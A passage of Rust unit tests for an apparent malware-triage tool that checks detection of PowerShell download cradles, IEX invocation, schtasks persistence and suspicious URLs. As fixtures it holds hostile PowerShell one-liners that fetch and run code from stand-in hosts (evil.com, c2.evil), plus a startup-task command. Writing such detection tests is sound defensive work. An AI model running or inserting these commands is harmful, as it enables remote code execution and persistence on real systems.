            names.iter().any(|n| n.contains("ps-encoded-command")),
            "indicators: {names:?}"
        );
    }

    #[test]
    fn test_script_powershell_iex() {
        let script = b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')";
        let triage = Triage::new();
        let result = triage.analyze(script).unwrap();
        let names: Vec<_> = result.indicators.iter().map(|i| i.name.as_str()).collect();
        assert!(
            names.iter().any(|n| n.contains("ps-invoke-expression")),
            "indicators: {names:?}"
        );
    }

    #[test]
    fn test_script_download_cradle() {
        let script = b"$wc = New-Object Net.WebClient\n$wc.DownloadString('http://c2.evil/')";
        let triage = Triage::new();
        let result = triage.analyze(script).unwrap();
        let names: Vec<_> = result.indicators.iter().map(|i| i.name.as_str()).collect();
        assert!(
            names.iter().any(|n| n.contains("ps-download-cradle")),
            "indicators: {names:?}"
        );
    }

    #[test]
    fn test_script_schtasks() {
        let script = b"schtasks /create /tn evil /tr cmd.exe /sc onstart";
        let triage = Triage::new();
        let result = triage.analyze(script).unwrap();
        let names: Vec<_> = result.indicators.iter().map(|i| i.name.as_str()).collect();
        assert!(
            names.iter().any(|n| n.contains("schtasks-create")),
            "indicators: {names:?}"
        );
    }

    #[test]
    fn test_script_shell_shebang() {
        let script = b"#!/bin/bash\necho hello world\nls -la";
        let triage = Triage::new();
        let result = triage.analyze(script).unwrap();
        let names: Vec<_> = result.indicators.iter().map(|i| i.name.as_str()).collect();
        assert!(
            names.iter().any(|n| n.contains("script-type:shell")),
            "indicators: {names:?}"
        );
    }

    // -----------------------------------------------------------------------
    // IndicatorJson
    // -----------------------------------------------------------------------

    #[test]
    fn test_indicator_json_from() {
        let ind = TriageIndicator {
            name: "test-ind".to_string(),
            description: "desc".to_string(),
            threat_level: ThreatLevel::Medium,
            category: "cat".to_string(),
            evidence: "ev=1".to_string(),
        };
        let json = TriageIndicatorJson::from(&ind);
        assert_eq!(json.name, "test-ind");
        assert_eq!(json.threat_level, "Medium");
        assert_eq!(json.category, "cat");
    }

    #[test]
    fn test_report_serializes_indicators() {
        let data = b"some test data here";
        let mut r = TriageResult::new(FileKind::Pe64, data);
        r.add_indicator(TriageIndicator {
            name: "test".to_string(),
            description: "testing".to_string(),
            threat_level: ThreatLevel::Low,
            category: "test".to_string(),
            evidence: "e=1".to_string(),
        });
        let report = r.to_report(vec![]);
        let json = serde_json::to_string(&report).unwrap();
        assert!(json.contains("test"));
        assert!(json.contains("Low"));
    }

    // -----------------------------------------------------------------------
    // is_ipv4 + is_likely_base64 via classify
    // -----------------------------------------------------------------------

    #[test]
    fn test_classify_no_false_positive_short_base64() {
        // Too short to trigger base64 classification
        let s = ExtractedString {
            value: "aGVsbG8=".to_string(), // "hello" but too short
            offset: 0,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        // Should NOT be classified as base64 (< 32 chars)
        assert!(
            !sus.iter()
                .any(|x| x.category == StringCategory::Base64Payload)
        );
    }

    #[test]
    fn test_classify_ftp_url() {
        let s = ExtractedString {
            value: "ftp://files.evil.net/tools/nc.exe".to_string(),
            offset: 0,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        assert!(!sus.is_empty());
        assert_eq!(sus[0].category, StringCategory::NetworkUrl);
    }

    // -----------------------------------------------------------------------
    // extract_strings_auto_va — non-PE fallback branch
    // -----------------------------------------------------------------------

    #[test]
    fn test_extract_strings_auto_va_non_pe_fallback() {
        // Raw bytes that are not a PE — auto_va must fall back gracefully and
        // return hits with va == None (same as plain extract_strings).
        let data = b"Hello World this is a test string that is long enough ABCDEFGHIJ";
        let hits = StringHeuristics::extract_strings_auto_va(data, 4);
        assert!(!hits.is_empty(), "should find at least one string");
        assert!(
            hits.iter().all(|h| h.va.is_none()),
            "non-PE input: all va fields must be None"
        );
    }

    #[test]
    fn test_extract_strings_with_sections_populates_va() {
        let mut data = vec![0u8; 0x400];
        data[0x100..0x100 + 12].copy_from_slice(b"HelloFromVA!");
        let sections = [SectionInfo {
            file_offset: 0x80,
            file_size: 0x200,
            virtual_address: 0x400_1000,
        }];
        let hits = StringHeuristics::extract_strings_with_sections(&data, 8, &sections);
        let h = hits
            .iter()
            .find(|s| s.value == "HelloFromVA!")
            .expect("string should be found");
        // 0x100 - 0x80 = 0x80; 0x400_1000 + 0x80 = 0x400_1080
        assert_eq!(h.va, Some(0x400_1080));
    }
}

